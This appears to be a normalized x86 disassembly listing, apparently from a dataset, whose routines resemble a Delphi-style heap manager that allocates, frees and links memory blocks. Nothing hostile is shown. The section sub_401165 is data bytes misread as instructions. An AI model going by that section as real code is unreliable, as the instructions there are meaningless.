sub_401143
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403354
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401165
inc ebp
adc [ eax ] eax
dec edi
adc [ eax ] eax
pop ecx
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc [ gs : eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov al [ 0xffffffffe8004010 ]
xor al 0x40
add [ eax + 0x57 ] ah
inc eax
add [ edi + edx * 2 + 0x40 ] ch
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ edi + edx * 2 + 0x40 ] bh
add [ edx + esi + 0x40 ] dl
add [ eax + 0x11004032 ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ ecx + 0x11 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x25
jb r-xdata
test al 0x51
dec eax
add [ ebx - 0x5bda0040 ] cl
push ecx
dec eax
add [ ebx - 0x5fda0040 ] cl
push ecx
dec eax
add [ ebx - 0x63da0040 ] cl
push ecx
dec eax
add [ ebx - 0x67da0040 ] cl
push ecx
dec eax
add [ ebx - 0x6bda0040 ] cl
push ecx
dec eax
add [ ebx - 0x6fda0040 ] cl
push ecx
dec eax
add [ ebx - 0x73da0040 ] cl
push ecx
dec eax
add [ ebx - 0x77da0040 ] cl
push ecx
dec eax
add [ ebx - 0x7bda0040 ] cl
push ecx
dec eax
add [ ebx - 0x27da0040 ] cl
push ecx
dec eax
add [ ebx - 0x7fda0040 ] cl
push ecx
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x7825ffc0 ] cl
push ecx
dec eax
add [ ebx - 0xfda0040 ] cl
push ecx
dec eax
add [ ebx - 0x13da0040 ] cl
push ecx
dec eax
add [ ebx - 0x17da0040 ] cl
push ecx
dec eax
add [ ebx + 0x7425ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x7025ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x25ffc0 ] cl
push edx
dec eax
add [ ebx - 0x3da0040 ] cl
push ecx
dec eax
add [ ebx - 0x7da0040 ] cl
push ecx
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x6825ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x6425ffc0 ] cl
push ecx
dec eax
add [ ebx + 0x6025ffc0 ] cl
push ecx
dec eax
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401380
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401340
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013d8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401380
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401420
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401408
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013d8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401490
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013d8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401524
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401358
xor eax eax
mov [ ebx ] eax
sub_401588
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401350
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401350
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013d8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401358
xor eax eax
mov [ ebx ] eax
sub_401600
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401358
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401408
mov [ rw-data ] 0x1
sub_4016b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401350
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40174c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401358
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401524
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016b8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401420
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401600
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401408
jmp r-xdata
sub_40185c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401588
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401420
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016b8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401600
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401408
jmp r-xdata
sub_401980
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40174c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401600
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401490
jmp r-xdata
sub_401a0c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ac2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401360
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
push 0xff8
push 0x0
call sub_401340
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ac9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401370
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ad0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401ba6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401368
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401358
mov ebx [ ebx ]
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax rw-data
call sub_4013d0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401378
retn
push rw-data
call sub_401370
sub_401bb0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c14
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c44
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e18
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c98
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c74
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cc0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bb0
add ebx esi
mov [ rw-data ] 0x6
sub_401d30
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bb0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d68
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c14
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401980
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401980
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c44
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401490
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c98
sub_401e18
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d68
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ea0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c74
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401eec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401ea0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401420
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cc0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d30
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c44
sub [ edi + 0x4 ] 0x4
sub_401f78
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017cc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fa4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40185c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fd8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402004
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bb0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e18
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f78
test al al
jne r-xdata
mov eax esi
call sub_401fd8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a0c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402274
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401368
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402004
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401370
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403ad8
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403ad8
jmp r-xdata
sub_402288
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40241a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401368
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
